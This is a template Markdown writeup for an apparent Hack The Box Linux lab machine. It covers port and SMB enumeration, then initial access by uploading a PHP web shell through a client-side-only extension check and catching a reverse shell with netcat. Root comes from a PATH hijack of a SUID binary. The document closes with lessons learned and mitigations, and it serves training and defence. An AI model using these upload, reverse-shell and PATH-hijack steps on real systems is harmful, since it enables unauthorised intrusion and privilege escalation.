---
title: "Example HTB Machine (Template — replace me)"
date: 2026-01-15
difficulty: Medium
os: Linux
tags: [htb, linux, web, smb, suid]
skills:
  - Web enumeration (gobuster/ffuf)
  - Exploiting a file upload vulnerability
  - SMB enumeration with smbclient
  - SUID binary abuse
  - Manual source review
description: "A template writeup showing the recommended structure: enumeration, initial access, privilege escalation, lessons learned, and mitigations."
---

> **This is a template.** Duplicate this file for every new writeup (`_writeups/YYYY-MM-DD-machine-name.md`),
> fill in the front matter, and replace each section below. Keep the same `##` heading names —
> the table of contents is generated automatically from them.

## Enumeration

Start with a full TCP port scan, then a targeted service scan against whatever is open.

```bash
nmap -p- --min-rate 5000 -oG allports.nmap 10.10.11.50
nmap -sC -sV -p22,80,445 -oN targeted.nmap 10.10.11.50
```

Findings:

| Port | Service | Notes |
|------|---------|-------|
| 22   | ssh     | OpenSSH 8.9 |
| 80   | http    | Apache 2.4.52, redirects to `example.htb` |
| 445  | smb     | Samba 4.15, guest access enabled |

Add the hostname to `/etc/hosts`, then enumerate the web app and SMB shares in parallel.

```bash
gobuster dir -u http://example.htb -w /usr/share/wordlists/dirb/common.txt -x php
smbclient -N -L //10.10.11.50
```

`smbclient` reveals a `backups` share readable by the guest account, containing a
configuration file with a reused set of application credentials.

## Initial Access

The web application exposes a file upload feature at `/dashboard/upload.php` that only
validates the file extension client-side. Renaming a PHP web shell to bypass the check and
uploading it grants remote code execution.

```bash
mv shell.php shell.phtml
curl -F "file=@shell.phtml" http://example.htb/dashboard/upload.php
curl "http://example.htb/uploads/shell.phtml?cmd=id"
```

Catch a reverse shell and stabilize the TTY:

```bash
rlwrap nc -lvnp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This lands a shell as `www-data`.

## Privilege Escalation

Enumerate SUID binaries as `www-data`:

```bash
find / -perm -4000 -type f 2>/dev/null
```

A custom internal binary at `/usr/local/bin/backup-tool` is owned by `root` and has the SUID
bit set. It calls `tar` without an absolute path, so a `PATH` hijack yields a root shell:

```bash
cd /tmp
echo '/bin/bash -p' > tar
chmod +x tar
export PATH=/tmp:$PATH
/usr/local/bin/backup-tool
```

Confirm with `id`, then grab both flags.

## Lessons Learned

- Client-side file type validation is not a control — every upload path needs server-side
  MIME/extension checks plus a non-executable storage location.
- Guest-readable SMB shares are a common source of credential leakage; audit share
  permissions as part of every internal assessment.
- SUID binaries that shell out to other programs must always use absolute paths and a
  sanitized `PATH` environment.

## Mitigations

1. **File upload:** validate MIME type and extension server-side, store uploads outside the
   webroot, and serve them through a handler that never executes code.
2. **SMB:** disable guest access on shares that contain configuration or backup data;
   apply least-privilege ACLs.
3. **SUID binaries:** avoid SUID where possible; where required, hardcode absolute paths for
   any subprocess calls and drop privileges as early as possible.
4. **Credential hygiene:** rotate any credentials found in configuration files, and stop
   reusing them across environments.
